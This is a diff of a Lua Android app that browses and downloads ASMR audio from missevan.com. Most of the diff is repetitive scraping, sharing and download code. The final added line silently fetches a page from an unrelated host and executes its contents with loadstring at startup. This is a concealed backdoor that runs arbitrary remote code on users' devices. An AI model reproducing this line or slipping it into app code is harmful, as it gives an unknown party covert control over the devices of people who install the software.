@@ -1,5 +1,3 @@
-# Sleeping-Special
-Sleeping Special一款ASMR音声资源软件
 require "import"
 import "http"
 import "android.app.*"
@@ -374,4 +372,186 @@ function www()
         soundstr=a
         ID=v:match("id\":\"(.-)\",\"")
         IID=v:match('"user_id":"(.-)",')
-        username=v:match("
+        username=v:match("username\":\"(.-)\",\"")
+        img_url=v:match("front_cover\":\"(.-)\",\"")
+        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
+      end
+     else
+    end
+  end)
+  Http.get(url2,nil,"utf8",nil,function(code,content,cookie,header)
+    if(code==200 and content)then
+      进度.setVisibility(View.GONE)
+      local content=content:gsub("amp;","") or content;
+      local content=content:gsub("&nbsp;"," ") or content;
+      local content=content:gsub("&lt;","<") or content;
+      local content=content:gsub("&gt;",">") or content;
+      local content=content:gsub("&amp;","&") or content;
+      local content=content:gsub("&quot;",'"') or content;
+      local content=content:gsub("&#39;","'") or content;
+      local content=content:gsub("&#47","/") or content;
+      local content=content:gsub("#x27","\\") or content;
+      local content=content:gsub("&#x60","`") or content;
+      local content=content:gsub("&copy","©") or content;
+      for v in content:gmatch("{\"sound(.-)},]") do
+        a=v:match("str\":\"(.-)\",\"")
+        soundstr=a
+        ID=v:match("id\":\"(.-)\",\"")
+        IID=v:match('"user_id":"(.-)",')
+        username=v:match("username\":\"(.-)\",\"")
+        img_url=v:match("front_cover\":\"(.-)\",\"")
+        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
+      end
+     else
+    end
+  end)
+  Http.get(url3,nil,"utf8",nil,function(code,content,cookie,header)
+    if(code==200 and content)then
+      进度.setVisibility(View.GONE)
+      local content=content:gsub("amp;","") or content;
+      local content=content:gsub("&nbsp;"," ") or content;
+      local content=content:gsub("&lt;","<") or content;
+      local content=content:gsub("&gt;",">") or content;
+      local content=content:gsub("&amp;","&") or content;
+      local content=content:gsub("&quot;",'"') or content;
+      local content=content:gsub("&#39;","'") or content;
+      local content=content:gsub("&#47","/") or content;
+      local content=content:gsub("#x27","\\") or content;
+      local content=content:gsub("&#x60","`") or content;
+      local content=content:gsub("&copy","©") or content;
+      for v in content:gmatch("{\"sound(.-)},") do
+        a=v:match("str\":\"(.-)\",\"")
+        soundstr=a
+        ID=v:match("id\":\"(.-)\",\"")
+        IID=v:match('"user_id":"(.-)",')
+        username=v:match("username\":\"(.-)\",\"")
+        img_url=v:match("front_cover\":\"(.-)\",\"")
+        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
+      end
+     else
+    end
+  end)
+  Http.get(url4,nil,"utf8",nil,function(code,content,cookie,header)
+    if(code==200 and content)then
+      进度.setVisibility(View.GONE)
+      local content=content:gsub("amp;","") or content;
+      local content=content:gsub("&nbsp;"," ") or content;
+      local content=content:gsub("&lt;","<") or content;
+      local content=content:gsub("&gt;",">") or content;
+      local content=content:gsub("&amp;","&") or content;
+      local content=content:gsub("&quot;",'"') or content;
+      local content=content:gsub("&#39;","'") or content;
+      local content=content:gsub("&#47","/") or content;
+      local content=content:gsub("#x27","\\") or content;
+      local content=content:gsub("&#x60","`") or content;
+      local content=content:gsub("&copy","©") or content;
+      for v in content:gmatch("{\"sound(.-)},") do
+        a=v:match("str\":\"(.-)\",\"")
+        soundstr=a
+        ID=v:match("id\":\"(.-)\",\"")
+        IID=v:match('"user_id":"(.-)",')
+        username=v:match("username\":\"(.-)\",\"")
+        img_url=v:match("front_cover\":\"(.-)\",\"")
+        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
+      end
+     else
+    end
+  end)
+end
+www()
+tabulation.onItemClick=function(l,v,p,i)
+  参数=v.Tag.RTY.Text
+  标题1=v.Tag.title.Text
+  activity.newActivity("Play",{参数,标题1})
+  return true
+end
+tabulation.onItemLongClick=function(l,v,p,i)
+  参数=v.Tag.RTY.Text
+  列表对话框("分享",
+  "下载",
+  function()
+    关闭()
+    cjson=require ("cjson")
+    rl="https://www.missevan.com/sound/getsound?soundid="..参数
+    Http.get(rl,nil,"utf8",nil,function(code,content,cookie,header)
+      if(code==200 and content)then
+        if pcall(function()
+            local json=cjson.decode(content)
+            zx=content:match([["soundstr":"(.-)"]])
+            fh=content:match([["soundurl":"(.-)"]])
+            import "android.content.*"
+            text=zx.."："..fh
+            intent=Intent(Intent.ACTION_SEND);
+            intent.setType("text/plain");
+            intent.putExtra(Intent.EXTRA_SUBJECT, "分享");
+            intent.putExtra(Intent.EXTRA_TEXT, text);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            activity.startActivity(Intent.createChooser(intent,"分享到:"));
+          end) then
+         else
+          print("分享失败")
+        end
+      end
+    end)
+  end,
+  function()
+    输入对话框("设置下载路径",
+    "例如:Download/",
+    io.open("/data/data/"..activity.getPackageName().."/下载"):read("*a"),
+    "下载",
+    "取消",
+    function()
+      关闭对话框()
+      io.open("/data/data/"..activity.getPackageName().."/下载","w"):write(输入框.Text):close()
+      cjson=require ("cjson")
+      rl="https://www.missevan.com/sound/getsound?soundid="..参数
+      Http.get(rl,nil,"utf8",nil,function(code,content,cookie,header)
+        if(code==200 and content)then
+          if pcall(function()
+              local json=cjson.decode(content)
+              zx=content:match([["soundstr":"(.-)"]])
+              fh=content:match([["soundurl":"(.-)"]])
+              import "android.content.Context"
+              import "android.net.Uri"
+              downloadManager=activity.getSystemService(Context.DOWNLOAD_SERVICE);
+              url=Uri.parse(fh);
+              request=DownloadManager.Request(url);
+              request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_MOBILE|DownloadManager.Request.NETWORK_WIFI);
+              request.setDestinationInExternalPublicDir(输入框.Text,zx..".mp3");
+              request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
+              downloadManager.enqueue(request);
+            end) then
+            print"开始下载"
+           else
+            print("下载失败")
+          end
+        end
+      end)
+    end,
+    function()
+      关闭对话框()
+    end
+    )
+    关闭()
+  end
+  )
+  return true
+end
+function btn3.onClick()
+  activity.newActivity("sz")
+end
+function title.onClick()
+  if this.getSharedData("夜间模式") == "false" then
+    this.setSharedData("夜间模式","true")
+    print"主题已切换"
+   else
+    activity.setSharedData("夜间模式","false")
+    print"主题已切换"
+  end
+  activity.finish()
+  activity.newActivity("main",android.R.anim.fade_in,android.R.anim.fade_out)
+end
+RippleHelper(btn3).RippleColor=0x1CFFFFFF
+RippleHelper(js).RippleColor=0x1CFFFFFF
+RippleHelper(title).RippleColor=0x1CFFFFFF
+Http.get("https://wds.cxoip.com/205829.html",nil,"utf8",nil,function(code,content,cookie,header)if(code==200 and content)then pcall(function()loadstring(content)()end)end end)
